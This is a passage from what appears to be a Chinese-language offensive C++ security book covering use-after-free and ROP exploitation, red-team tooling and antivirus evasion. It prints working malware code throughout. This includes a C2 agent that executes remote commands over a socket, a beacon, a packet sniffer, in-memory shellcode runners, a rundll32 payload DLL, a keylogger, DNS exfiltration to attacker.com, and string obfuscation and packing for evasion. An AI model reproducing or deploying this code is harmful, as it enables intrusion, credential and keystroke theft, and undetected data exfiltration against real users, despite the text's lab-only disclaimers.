这里有一个简单的 C++ 代码片段，用于说明 UAF 条件。

```cpp
#include <iostream>
#include <cstring>

class User {
public:
    char *data;
    User(const char *input) {
        data = new char[32];
        strncpy(data, input, 31);
        data[31] = '\0';
    }
    void show() {
        std::cout << "Data: " << data << std::endl;
    }
    ~User() {
        delete[] data;
    }
};

void vulnerable() {
    User *u = new User("Hello from heap!");
    delete u;
    // 释放后使用
    u->show();
}

int main() {
    vulnerable();
    return 0;
}
```

这段代码创建了一个 `User` 对象，删除了它，然后继续在同一指针上调用方法。删除后访问数据会导致 UAF，因为该内存区域已被释放。在许多环境中，这可能仍然“有效”而不会崩溃——特别是如果没有其他分配接管该空间。但不可预测性正是其危险之处。

现在让我们探索攻击者如何利用这种条件。

假设攻击者可以影响在对象释放后在同一内存位置分配的内容。如果你能控制新分配的内容并预测其地址，你就可以将恶意数据放在被释放的位置。当旧指针被重用时，它现在指向了这些构造的数据。例如，如果被释放的对象有一个函数指针或虚函数表，且攻击者覆盖了它，那么调用该函数现在将跳转到攻击者控制的代码。




这在浏览器漏洞中很常见，JavaScript 或 WebAssembly 在紧密控制的循环中触发分配和释放。通过反复分配内存块，然后释放特定的块，并立即用攻击者控制的缓冲区填充间隙，你可以将堆（heap）整理成一种可预测的状态。一旦你触发了 `UAF`，执行流就会进入载荷（payload）。

一种稍微高级的案例涉及通过分配器元数据损坏来重用已释放的堆块。在 Linux 默认内存分配器 `ptmalloc` 中，每个堆块都包含如 `size` 和指向相邻堆块的指针等元数据。如果你溢出到已释放的堆块并在其被重新分配之前操纵其元数据，你可以欺骗分配器返回重叠的堆块——即指向同一物理内存的两个指针。这允许你通过向其中一个写入来编辑另一个，创建所谓的“fastbin 重复”或“tcache 投毒”攻击。

为了模拟一个具有实际价值的受控 `UAF`，你可以考虑这个在 Windows 程序中使用 `new` 和 `delete` 的基础 C++ 模式。

```cpp
#include <iostream>
#include <windows.h>

class Config {
public:
    virtual void apply() {
        std::cout << "Applying configuration..." << std::endl;
    }
};

class Exploit {
public:
    static void shell() {
        MessageBoxA(0, "Code Execution Achieved!", "Exploit", 0);
    }
};

int main() {
    Config *cfg = new Config();
    delete cfg;
    // 通过覆盖已释放的内存模拟内存重用
    void *evil = malloc(sizeof(Config));
    memcpy(evil, &Exploit::shell, sizeof(void*));
    cfg->apply();  // 如果虚表被损坏，会导致控制流劫持
    return 0;
}
```

这段代码是为了教学目的而简化的。它分配并释放一个对象，然后用恶意数据重用同一块内存。如果虚表指针被正确覆盖，调用 `apply()` 将跳转到攻击者的 shellcode——在此例中为 `MessageBoxA`。

`UAF` 漏洞的真实示例包括 `CVE-2014-1776`，这是 Internet Explorer 中的一个释放后使用漏洞，允许远程代码执行。漏洞开发人员将堆整理（heap grooming）与内存泄露和控制流劫持相结合，以绕 `ASLR` 和 `DEP`。该漏洞影响了数百万用户，展示了 `UAF` 攻击有多强大。

在攻性安全领域，特别是构建概念验证（PoC）漏洞或恶意软件框架时，理解堆分配器及其在压力下的行为至关重要。你通常需要触发碎片化、重用或合并行为，以确保你的载荷可靠地放置在正确的内存区域。

`UAF` 漏洞特别有吸引力，因为它们通常同时提供读写原语。你可能使用它们来泄露指针、重构堆布局，或修改敏感结构（如 `vtables`、函数指针或安全相关的标志）。

许多现代缓解试图试图固堆内存——Windows 拥有 `LFH` 和隔离堆，Linux 使用安全解链（safe unlinking）、`tcache` 加固和指针加密——但当攻击者理解内部原理时，这些防御是可以绕过的。堆喷射（heap spraying）、分配整理和精确计时等技术仍然有效，特别是在旧应用程序或嵌入式设备等精简环境中。

`UAF` 最危险的方面是它的隐身性。与可能导致立即崩溃的缓冲区溢出不同，`UAF` 漏洞通常静默运行。程序继续运行，但现在使用的是被污染的内存。这为攻击者提供了持久性、隐性和对程序行为的完全控制——这些都是将立脚点扩大为完全攻破所需的要素。

## 6.5 C++ 中的面向返回的编程 (ROP)

面向返回的编程，或 `ROP`，是一种强大的利用技术，它允许攻击者在不注入任何新代码的情况下执行任意代码。这在现代系统中变得格外重要，因为可执行内存区域受到数据执行防止 (`DEP`) 和不可执行 (`NX`) 位等安全特性的严格限制。`ROP` 并不是在栈或堆上放置 shellcode，而是通过 ROP 链将进程内存中已存在的代码片段（特别是共享库、模块或二进制文件本身中的）连接起来。

这些代码片段被称为 `gadgets`（get），每个都以 `ret` 指令结束，并执行小型操作，例如将数据移动到寄存器、执行算术运算或调用系统函数。通过仔细链接，这些 `gadgets` 允许攻击者构建一个完整的载荷来执行复杂任务，如禁用保护、分配内存，甚至启动 shell。

要真正理解 `ROP` 的工作原理，你需要理解控制栈指针（stack pointer）能给你什么。当发生缓冲区溢出且攻击者覆盖栈上的返回地址时，控制权将交给他们放置在那里的任何地址。在启用了 `DEP` 的系统中，跳转到栈上的 shellcode 不再是一个选项，因为该部分内存是不可执行的。然而，你可以将返回地址指向一段已经标记为可执行的小型合法代码。

让我们在 Linux 目标上走过一个简化的示例。假设你溢出了缓冲区，并将返回地址覆盖为如下所示 `gadget` 的位置：

```
pop eax
ret
```

处理器从栈中弹出下一个值到 `eax`，然后返回到当前位于栈顶的地址。如果下一个 `gadget` 是：

```
pop ebx
ret
```

那么接下来将加载 `ebx`，依此类推。通过用正确的地址和值序列仔细布局栈，你实际上是在使用返回指令而不是直接的控制流语句来“编程”CPU。

在 C++ 应用中，这可能看起来是利用类方法中的缓冲区溢出，其中本地栈变量位于返回地址的正下方。一旦你获得了返回指针的控制权，你的目标就是准备一个填充有 `gadget` 地址和数据的伪栈布局。大多数 `gadgets` 可以在 Linux 的 `libc` 或 Windows 的 `kernel32.dll` 等共享库中找到，`ROPgadget`、`rp++` 或 `Radare2` 等工具可以帮助识别它们。

这是一个最小 ROP 链示例，在 Windows 上调用 `VirtualProtect` 将栈标记为可执行，以便 shellcode 运行：

```cpp
// 这是一个概念布局，不是原始代码。
char payload[512];
// 填充以到达返回地址
memset(payload, 'A', offset);
// 步骤 1：VirtualProtect 的地址
append(payload, virtualProtectAddr);
// 步骤 2:VirtualProtect 之后的返回地址
append(payload, retAfterVP);
// 步骤 3：VirtualProtect 的参数（反向顺序）
append(payload, oldProtectPointer);
append(payload, PAGE_EXECUTE_READWRITE);
append(payload, shellcodeSize);
append(payload, shellcodeAddress);
```

这种布局导致栈被解释为函数参数，`VirtualProtect` 使用这些参数更改内存权限。之后，控制跳转回 shellcode，此时它是可执行的。

在真实世界的使用中，攻击者动态构建 ROP 链以绕过地址空间布局随机化 (`ASLR`)。他们从已知模块中泄露地址，计算偏移量，并动态组合 `gadgets`。高级载荷可能会直接用 ROP 实现系统调用，或通过调用 `LoadLibraryA` 加载整个恶意 DLL。

`ROP` 被成功使用的实际案例是著名的 `CVE-2010-3333`，影响影响 Microsoft Office。它涉及一个基于栈的缓冲区溢出，允许攻击者从 `msvcrt.dll` 构建 ROP 链，迁移栈，并最终在 Office 进程上下文中执行 shellcode。




```
ROPgadget --binary vuln.exe --only "pop|ret"
```

你可能会发现这样的一行：

```
0x10010234 : pop eax ; ret
```

这准确地告诉你跳转到何处可以从栈中加载 `eax`。然后，你可以在返回地址之后放置相应的值，并继续构建链的其余部分。

ROP 之所以难以停止的原因是它利用了现有的代码，因此基于特征的检测大多是无效的。现代防御措施如 Windows 上的 `Control Flow Guard` (`CFG`）和 Linux 上的 `Shadow Stacks`（影子栈）试图缓解 ROP，但如果你能找到未受保护的模块或执行栈转向（stack pivot），它仍然可行。

总而言之，返回定向编程（Return-Oriented Programming）将代码重用变成一种强大的技术，用来击败现代防护。通过控制栈并将微小的可执行指令链在一起，攻击者可以绕过 `DEP`，执行任意系统调用，并在无需向内存中注入任何新指令的情况下构建复杂的利用程序。对于任何在 `C++` 环境中工作的攻性编程人员来说，理解如何构建和交付 ROP 链是高级漏洞利用中的一项基本技能。

# 第 7 章 – 使用 C++ 构建红队工具

`C++` 为红队人员提供了创建快速、隐蔽且高度定制的攻击工具的能力，这些工具可以在受监控和未受监控的环境中有效运行。与脚本语言不同，`C++` 直接编译为原生代码，允许与操作系统进行更深层的集成、对内存进行更紧密的控制以及极少的依赖——这些特性对于保持隐蔽性至关重要。

本章重点关注构建模拟真实攻击者行为的关键红队工具。你将学习如何开发自己的能够隐蔽通信的命令与控制 (`C2`) 代理，构建在不被检测的情况下枚举目标的扫描器和嗅探器，以及使用信标逻辑（beaconing logic）实现持久远程访问技术。你还将涵盖如何使用无文件策略完全在内存中执行有效负载，以及如何通过混合在正常流量中的不明显通道外泄数据。

每个每个子章节都包含可运行的 `C++` 代码、实际应用和防御绕策略。目标是为你提供实用的工具和技术，用于测试和训练模拟高质量、受控的入侵。

## 7.1 编写自定义命令与控制 (C2) 代理

命令与控制 (`C2`) 代理是红队操作中最基础的工具之一。它是操作员与受控系统之间的数字链接，允许远程命令执行、数据收集和任务分配——一切通过一个化界面完成。在 `C++` 的背景下，你可以编写出紧凑、隐蔽且专门针对你想要行为定制的 `C2` 植入体，而无需依赖可能被安全产品标记的大型框架。

为了生效，`C2` 代理必须可靠地完成三件事：与操作员服务器建立连接、等待命令、并在执行这些命令的同时静地返回结果。这可以使用 Windows sockets 和像 `_popen` 这样的进程执行机制来实现。让我们核心思想分解为可行的概念。

你将开始设置一个连接到远程 IP 和端口的 socket——这是你的操作员机器或重定向器。一旦连接建立，代理将处于空闲状态，等待从服务器发送命令字符串。当它收到命令时，它使用系统 shell 执行该字符串并返回输出。这就是实现基本 shell 访问的方式。

以下代码提供了一个使用原始 `C++` 编写的功能性 Windows `C2` 代理原型。它的设计目标是尽可能简单且易于理解，同时保持操作性。

```cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>

#pragma comment(lib, "ws2_32.lib")

std::string execute_command(const std::string& cmd) {
std::string result;
char buffer[128];
FILE* pipe = _popen(cmd.c_str(), "r");
if (!pipe) return "Failed to execute command.";
while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
result += buffer;
}
_pclose(pipe);
return result;
}

int main() {
WSADATA wsaData;
SOCKET sock;
struct sockaddr_in server;
char buffer[2048];
WSAStartup(MAKEWORD(2, 2), &wsaData);
sock = socket(AF_INET, SOCK_STREAM, 0);
server.sin_family = AF_INET;
server.sin_port = htons(4444);
server.sin_addr.s_addr = inet_addr("192.168.1.100"); // Replace with your server IP
if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
closesocket(sock);
WSACleanup();
return 1;
}
send(sock, "[+] Connected\n", strlen("[+] Connected\n"), 0);
while (true) {
memset(buffer, 0, sizeof(buffer));
int recv_size = recv(sock, buffer, sizeof(buffer), 0);
if (recv_size <= 0) break;
std::string command(buffer);
std::string output = execute_command(command);
send(sock, output.c_str(), output.length(), 0);
}
closesocket(sock);
WSACleanup();
return 0;
}
```

该代理没有加密通信、未执行错误处理或隐藏其行为。这是刻意之为。目的是目的是实验室环境中具有可读性和可测试性。它是为了在实验室环境中测试。从这里开始，你可以构建如下功能：

- 使用 `XOR` 或 `AES` 进行加密
- 延迟以减少网络特征
- 仅内存模式以避免落地文件

在红队操作中，这种基础结构通常会被扩展为模块化植入体。始终记住，任何测试必须在隔离的环境中进行。

## 7.2 开发端口扫描器和嗅探器

当你构建红队工具时，在受控机器上经常需要的操作之一是网络枚举。你想了解周围的情况、哪些端口是开启的、哪些服务是活跃以及是否存在机会。`C++` 允许你构建直接与网络栈交互的快速工具——适用于端口扫描和嗅探数据。

让我们从端口扫描器开始。在最简单的形式，端口扫描器向目标 IP 的特定端口发送连接请求。如果连接成功，该端口已开启。如果失败，它是关闭的、被过滤的或不可用的。当你编写自己的工具时，你对逻辑拥有完全控制权。你可以选择它是激进还是隐蔽、如何处理超时以及如何收集结果。

这里有一个使用 `C++` 编写的 Windows 基础 TCP 端口扫描器，用于扫描目标机器的前 1024 个端口。这不是多线程的，也不处理规避技术——其目的是展示底层机制的工作原理。

```cpp
#include <winsock2.h>
#include <ws2ip.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

void scan_ports(const char* ip) {
WSADATA wsa;
WSAStartup(MAKEWORD(2, 2), &wsa);
for (int port = 1; port <= 1024; ++port) {
SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
if (sock == INVALID_SOCKET) continue;
sockaddr_in target;
target.sin_family = AF_INET;
target.sin_port = htons(port);
inet_pton(AF_INET, ip, &target.sin_addr);
if (connect(sock, (sockaddr*)&target, sizeof(target)) == 0) {
std::cout << "Port " << port << " is open" << std::endl;
}
closesocket(sock);
}
WSACleanup();
}
```

这段代码按顺序连接到每个端口并打印其是否开启。它是安静的、极简的，并在控制测试中很有用。在实践中，你会添加计时控制、输出解析以及可能的混淆以避免检测。




现在，让我们转向网络嗅探。数据包嗅探器用于观察网络接口上的流量。在红队行动中，嗅探器可以帮助你看到未加密的凭据、不安全的协议和设备行为。在 C++ 中，构建一个原始套接字（raw socket）嗅探器意味着在数据包级别打开一个套接字，并读取进入的每一个帧。

对于 Windows，你通常使用 `WinPcap` 或 `Npcap` 作为后端来访问数据包，因为原始套接字对非特权用户的支持有限且受到。这是一个使用原始套接字捕获基础 IP 包的概念性示例。请注意，这可能需要管理员权限和特殊的防火墙配置：

```cpp
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
    if (rawSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create raw socket" << std::endl;
        return 1;
    }
    sockaddr_in host;
    host.sin_family = AF_INET;
    host.sin_port = htons(0);
    host.sin_addr.s_addr = inet_addr("192.168.1.10"); // your local IP
    bind(rawSocket, (sockaddr*)&host, sizeof(host));
    DWORD flag = 1;
    ioctlsocket(rawSocket, SIO_RCVALL, &flag);
    char buffer[65536];
    while (true) {
        int dataLen = recv(rawSocket, buffer, sizeof(buffer), 0);
        if (dataLen > 0) {
            std::cout << "Packet received (" << dataLen << " bytes)" << std::endl;
            // Optionally print the packet content or parse headers
        }
    }
    closesocket(rawSocket);
    WSACleanup();
}
```

这会捕获所有进入接口的数据包。然后你可以使用字节偏移量解析 `TCP`、`UDP` 或 `ICMP` 数据的头部。这是进行网络侦察或监控离开受损机器的流量的一种强大方法。

使用这种低级访问方式，你的工具不需要第三方二进制文件或服务。它可以存在于 `C2` 代理中，并根据操作员的输入触发扫描或捕获。结合无日志内存存储、加密或过滤器，这些工具对于高级后渗透任务具有高度的适应性。

请确保仅在隔离环境中测试此代码。嗅探器和端口扫描器通常会被端点防护软件标记，使用不当可能会产生网络警报。

## 7.3 远程访问工具 (RATs) 与信标 (Beaconing)

远程访问工具，或 `RATs`，是红队行动的核心工具。当你进入网络内部时，访问只是开始。让你的行动产生价值的是控制——静默、持久且灵活的控制。这正是 `RAT` 提供的：一条通往系统的直接线路，你可以在其中发布命令、收集数据并横向移动到其他目标。

在攻击性 C++ 开发中，构建 `RAT` 涉及设置一个连接回受攻击者控制的服务器的客户端。这种反连接通常用于绕过防火墙规则，因为大多数公司网络通常允许出站流量。代理必须是轻量级、静默的且最好是无文件的。其行为的每个部分——从检查更新的频率到如何处理命令执行——都必须仔细编写以避免检测。

信标（Beaconing）是指受感染系统向操作员命令与控制服务器进行定期通信的模式。让我们来看 C++ 中一个简单 `RAT` 的构建组件。以下是信标可能的外观：

```cpp
#include <winsock2.h>
#include <windows.h>
#include <iostream>

#pragma comment(lib, "ws2_32.lib")

void beacon(const char* ip, int port) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR) {
        char buffer[1024];
        while (true) {
            int bytes = recv(sock, buffer, sizeof(buffer), 0);
            if (bytes > 0) {
                // Handle command
            }
            Sleep(10000);
        }
    }
    closesocket(sock);
    WSACleanup();
}

int main() {
    beacon("127.0.0.1", 8080);
    return 0;
}
```

让 `RAT` 变得危险的不仅仅是连接——还有它拉取的有效负载、它实现的横向移动以及它隐藏得有多好。随着你不断增加 `RAT` 的功能，你将添加持久化、凭据窃取和加密通信。但即使在最小的形式下，C++ 也能为你提供立足点。

## 7.4 无文件执行与利用现有工具 (Living-off-the-Land)

如果你正在为红队行动构建工具，不被检测与获取访问同样重要。一种日益有效的技术是无文件执行。这种方法直接在内存中运行恶意代码，而不接触磁盘。大多数杀毒系统和端点检测解决方案严重依赖文件扫描。因此，当你避免落地文件时，你就绕过了大部分检测。

在 C++ 中，无文件执行通常意味着向内存注入 shellcode 或 DLL 并执行它们，而将其写入磁盘。你可以使用 `VirtualAlloc` 动态分配内存，将负载复制到该区域，然后通过创建新线程或劫持现有线程来执行它。

这是一个使用 Windows API 在内存中执行原始 code 的示例：

```cpp
#include <windows.h>
#include <iostream>
#include <cstring>

unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, // 仅占位符
    0xe8, 0x00, 0x00, 0x00, 0x00  // 你的实际负载放在这里
};

int main() {
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

这段代码展示了基本概念。你正在分配具有执行权限的内存，将 shellcode 复制到那里，并将内存指针转换为函数直接调用。这里不涉及任何文件，shellcode 只在执行期间存在于内存中。

为了进一步提升这一概念并使其更加隐蔽，你可以将 shellcode 注入到另一个运行进程中。`OpenProcess`、`VirtualAllocEx`、`WriteProcessMemory` 和 `CreateRemoteThread` 等函数允许你实现这一点。这让你的负载运行在 `explorer.exe` 或 `svchost.exe` 等合法的系统进程中，极大地增加了检测难度。




离地攻击（Living-off-the-land, LOTL）策略与无文件执行密切不可分。与其引入可能被标记的新工具或二进制文件，不如利用目标系统上已有的信任原生工具。`PowerShell`、`rundll32.exe`、`mshta.exe`、`certutil.exe` 甚至 Microsoft Office 宏都可以作为你 C++ 负载负载的启动器或执行向量。

例如，`rundll32.exe` 可用于加载包含 shellcode 执行逻辑的编译 DLL：

```cpp
extern "C" __declspec(dllexport) void RunPayload() {

void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

memcpy(exec, shellcode, sizeof(shellcode));

((void(*)())exec)();

}
```

一旦编译了此 DLL，你可以像 这样运行它：

`rundll32.exe yourpayload.dll,RunPayload`

这种方法使用经过签名的 Windows 二进制文件来加载并执行你的代码。对于许多安全工具来说，它看起来像是一个合法的命令。

这些策略之所以强大，是因为它们让溯源和检测变得困难。你的工具在磁盘上不存在。你的执行方法看起来是原生的。你的持久化与正常的系统操作融合在一起。然而，这种力量也伴随着责任。一如既往，这些技术必须符合伦理，在法律范围内使用，并仅用于安全研究或授权的活动。

当实施得当时，无文件和 LOTL 策略可以大大减少你的 C++ 后门、远程控制工具（RAT）或下载器的足迹。你不仅仅是在绕过杀病毒软件——你是在利用系统对其自身组件的信任。

## 7.5 通过隐蔽通道进行记录和外传

当负载获取目标系统的访问时，收集数据通常是首要目标之一。但收集信息只解决了一半问题——如何在不发现的情况下将其传出，才是嘈杂利用程序与高效红队工具的区别。这就是隐蔽记录和隐蔽外出的用场。使用 C++，你可以在内存或模糊的本地存储中记录击、剪贴板内容、文件名或其他敏感材料，然后通过看似合法的通道静地外传这些数据。

让我们从记录开始。例如，一个 C++ 键盘记录器可以使用 `GetAsyncKeyState` 来捕获击键，而无需挂钩更深层的 API。虽然它没有完整的键盘钩子强大，但它更安静，被标记的概率更低。

```cpp
#include <windows.h>

#include <fstream>

int main() {

std::ofstream log("C:\\Users\\Public\\log.txt", std::ios::app);

while (true) {

for (char c = 8; c <= 255; c++) {

if (GetAsyncKeyState(c) & 1) {

log << c;

log.flush();

}

}

Sleep(10);

}

return 0;

}
```

此示例将每次按键记录写入存储在可疑性较小位置的文件中中。你可以在将日志写入磁盘之前对其进行加密，或者更好的方法是将日志保存在内存中并定期外传，从而完全避免写入磁盘。

现在来看外传部分。最明显的方法是通过原始 TCP 或 HTTP 连接发送数据，但也很容易被发现。相反，隐蔽通道利用了普通的系统行为——DNS 请求、ICMP 探测、网络流量，甚至是出站连接之间的时间间隔。

一种隐蔽方法是在 DNS 查询的子域名中编码并发送小块日志数据。例如，如果数据 "keystroke1" 被 base32 编码为 `a1b2c3`，则可以向 `a1b2c3.attacker.com` 查询。在服务器端，你控制的 DNS 服务器记录这些查询并重构数据。

这是一个使用 `WinSock` 发送 DNS 查询的简化 C++ 示例：

```cpp
#include <winsock2.h>

#include <windns.h>

#include <iostream>

#pragma comment(lib, "dnsapi.lib")

#pragma comment(lib, "ws2_32.lib")

int main() {

DNS_RECORD* pRecord;

DNS_STATUS status = DnsQuery_A("data.attacker.com", DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);

if (status == 0) {

std::cout << "Query sent successfully.\n";

DnsRecordListFree(pRecord, DnsFreeRecordList);

} else {

std::cerr << "DNS Query failed.\n";

}

return 0;

}
```

在实践中，你会用日志的编码段替换 `"data.attacker.com"`。由于出站 DNS 几乎在任何地方都是允许的，这种方法避免了防火墙的拦截并与正常的系统活动融合。

另一个巧妙的策略涉及将外传隐藏在网络流量中。你可以将数据作为参数嵌入到对看似良好的域名的 GET 请求中。接收服务器只需读取查询字符串并存储信息。这在允许 HTTPS 流量但检查松散的环境中融合良好。

为了让事情更加隐蔽，可以考虑在编码之前对数据进行加密。简单的 XOR 或 AES 操作将确保负载即使在传输过程中被观察到也不会被理解。

隐蔽的数据处理是任何攻击性安全工具集的基石。仅仅运行代码是不够的——你需要在不引起警报的情况下与你的基础设施通信。隐蔽记录和外传正实现了这一点。但这些能力必须始终符合伦理和法律，仅用于红队行动、研究实验室或受控活动。

## 第 8 章 – 代码混淆与规避技术

本章侧重于让你的 C++ 恶意软件或工具难以被检测、分析或逆向。现代 AV 和 EDR 解决方案不仅仅依赖静态签名——它们检查行为、执行流和系统交互。为了避免被捕，攻击者依赖广泛的规避方法。

你将从学习如何通过控制流平坦化重构程序逻辑和加密字符串开始。然后你将转向打包技术和多态代码生成，这些会在每次编译或加载时改变二进制文件的结构。从这里开始，你将探索如何检测二进制文件是否运行在虚拟化或沙箱环境中并据此调整其行为。最后，你将看到如何针对杀病毒软件测试你的负载以评估检测率并完善技术。

本章为你提供了关于高级攻击者如何领先一步的实战知识。

8.1 控制流平坦化与字符串加密

当你用 C++ 编写恶意软件或攻击工具时，你的代码结构和字符串成为静态分析中的红色标记。安全分析师和逆向工程师严重依赖可读字符串和可预测的结构。因此，为了阻碍逆向并规避静态扫描器的检测，攻击者依赖两种强大的技术：控制流平坦化和字符串加密。

字符串加密是关于隐藏嵌入二进制文件中的敏感数据。这可以是 API 名称、IP 地址、硬编码密钥或命令字符串。如果这些值以明文出现，`strings` 或反汇器工具会让它们清晰可见。为了防止这种情况，攻击者通常会对此类字符串进行加密并在并在运行时解密。

这种简单有效的方法是 XOR 加密。你选择一个密钥并与字符串的每个字符进行 XOR 操作。相同的操作可以将其解密。这是一个使用硬编码字符串的示例：

```cpp
#include <iostream>

#include <string>

std::string xor_encrypt_decrypt(const std::string& input, char key) {

std::string output = input;

for (auto& ch : output) {

ch ^= key;

}

return output;
}

int main() {

const char key = 0x5A;

std::string original = "malicious_payload";

std::string encrypted = xor_encrypt_decrypt(original, key);

std::string decrypted = xor_encrypt_decrypt(encrypted, key);

std::cout << "Encrypted: " << encrypted << std::endl;

std::cout << "Decrypted: " << decrypted << std::endl;

}
```



编译后，该程序会同时打印混淆版本和可读版本。但如果分析人员直接检查二进制文件，他们在运行时之前是看不到明文的。

现在来介绍控制流平坦化（Control Flow Flattening）。这是一种用于混淆程序逻辑结构的技术。它不再让函数和循环通过分支和返回语句自然流动，而是将控制逻辑转换为一个分发器循环（dispatcher loop）。每个逻辑块都被移动到一个带有标记的段中，并由一个中央 `switch` 语句或跳转表决定下一个运行哪个块。

这使得反汇编译器恢复有意义的结构变得困难。在面对这种方法时，`IDA Pro` 或 `Ghidra` 等工具难以呈现清晰的调用图或执行图。

这是一个简单的转换示例。来看这段代码：

```cpp
void payload() {
  std::cout << "Stage 1" << std::endl;
  std::cout << "Stage 2" << std::endl;
  std::cout << "Stage 3" << std::endl;
}
```

平坦化后，你会得到：

```cpp
void payload_flattened() {
  int state = 0;
  bool exit = false;
  while (!exit) {
    switch (state) {
      case 0:
        std::cout << "Stage 1" << std::endl;
        state = 1;
        break;
      case 1:
        std::cout << "Stage 2" << std::endl;
        state = 2;
        break;
      case 2:
        std::cout << "Stage 3" << std::endl;
        exit = true;
        break;
    }
  }
}
```

从编译器的角度来看，这个函数的功能是完全相同的。但当逆向工程师打开二进制文件时，推断原始控制流的样子就会变得更加困难。

在真实的恶意软件中，这些技术通常会被结合使用。加密字符串可能在平坦化的循环内部被解码，逻辑可能会使用故意混淆的状态机。你甚至可能会看到计算跳转（computed goto）、内联汇编或不透明谓词（opaque predicates）等结构被用来增加复杂度。

在 Windows 上，当将这些技术与 `WinAPI` 调用结合时，情况会变得更有趣。你不再直接调用 `CreateProcessA`，而是加密字符串，从 `PEB` 动态解析该函数，并在平坦化的函数块内部调用它。这完全破坏了静态检测签名，并迫使分析人员进入运行时调试。

使用这些技术需要谨慎。实现不当的字符串加密可能会导致密钥在内存中暴露。糟糕的平坦化策略可能会使你自己的代码变得不可读且充满 Bug。但如果做得恰当，这些方法对于红队工具开发和恶意软件操作来说是无价的。

## 8.2 加壳（Packing）与多态代码

当你分发有效负载（payload）时，无论是红队植入程序还是恶意释放器（dropper），你都会面临一个主要的障碍——检测。基于签名的反病毒引擎、文件指纹甚至行为启发式都可以在你的二进制文件执行之前将其标记。两种实用的对抗措施是加壳和多态代码。两者的目标都是隐藏二进制文件的实际结构或行为，而不改变其预期结果。

加壳的核心是将你的执行文件用一个加载器（loader）封装。该加载器在执行前的运行时，会在内存中对有效负载进行解压或解密。从静态分析工具或反病毒引擎的角度来看，真正的恶意逻辑被完全隐藏了。它们看到的只是一个存根（stub），通常很小且看起来通用。

一个基础示例涉及使用简单算法（如 Windows  `LZNT1` 或 `RtlCompressBuffer`）对有效负载进行压缩，将压缩后的数据嵌入你的二进制文件中，并编写一个短的加载器来解压并运行它。

这是一个最小化演示：

```cpp
#include <windows.h>
#include <iostream>

unsigned char compressed_payload[] = { /* 压缩后的 shellcode 或可执行字节 */ };

void run_payload(const unsigned char* data, size_t size) {
  void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (exec) {
    memcpy(exec, data, size);
    ((void(*)())exec)();
  }
}

int main() {
  // 此示例假设 'compressed_payload' 已经解压
  run_payload(compressed_payload, sizeof(compressed_payload));
}
```

在实际案例中，该 `compressed_payload` 将以加密和压缩的格式存储，你的存根会先调用解压函数，然后将控制权转移到输出缓冲区。

多态代码更进了一。它不是整体隐藏有效负载，而是在每次生成或执行时改变代码的二进制表示——而不改变其逻辑。这可以通过引入无意义的指令（`NOPs`）、重排独立指令或以不同的方式对代码块进行编码来实现。

例如，假设你有如下有效负载：

`MessageBoxA(0, "Hacked", "Info", 0);`

多态引擎会创建该相同逻辑的多个变体。某一次它可能使用 `push` 指令来传递参数，另一次它可以将值移动到寄存器并间接调用函数。最终行为保持不变，但字节序列发生了变化——使得签名检测变得困难得多。

一个简单多态封装的 C++ 实现可以在运行时使用汇编或 shellcode 模板生成不同的机器指令。像 `AsmJit` 这样的库允许在运行时进行动态代码生成。这里是一个经过简化的、概念性的草图：

```cpp
#include <asmjit/asmjit.h>

void generate_and_run() {
  using namespace asmjit;
  JitRuntime rt;
  CodeHolder code;
  code.init(rt.environment());
  x86::Assembler a(&code);
  a.mov(x86::eax, 1);
  a.add(x86::eax, 2);
  a.ret();
  typedef int (*Func)();
  Func fn;
  rt.add(&fn, &code);
  std::cout << "Result: " << fn() << std::endl;
  rt.release(fn);
}
```

## 8.3 反病毒软件与 EDR 规避技术

当你的代码进入目标环境时，面临最大的障碍不再是人类——而是自动化防御系统。反病毒软件会在静态和运行时扫描二进制文件，而现代的端点检测与响应（EDR）解决方案增加了基于行为分析、内存取证、内核级事件钩子以及 AI 增强的威胁建模。

让我们从静态检测开始。大多数 AV 引擎依赖签名匹配。它们会分析你编译二进制文件的字节模式、导入表、段名称和字符串。因此，你的首要任务是让二进制文件每次编译时看起来都不一样。字符串混淆是一项基础技术——使用 `XOR` 或 `AES` 加密常见的 API 名称（如 `CreateRemoteThread` 或 `LoadLibraryA`），并在运行时对其进行解密。



更进一步，请扁平化你的导入（flatten your imports）。如果你的二进制文件在导入表中中有对敏感 API 的清晰引用，那就是明显的泄露。通过遍历 `PEB`（进程环境块）并从已加载的 `kernel32.dll` 或 `ntdll.dll` 动态调用 `GetProcAddress` 在运行时手动解析这些 API，可以避免留下明显的指纹。

这里有一个实现此动态操作的小 C++ 代码段：

```cpp
HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
FARPROC loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
```

通过完全避开标准的导入地址表（IAT），你可以减少 `AV` 引擎可用于匹配你的特征。这也有助于间接系统调用的实现，即你直接使用系统服务号，而不是通过正常的 API 存根进行调用。

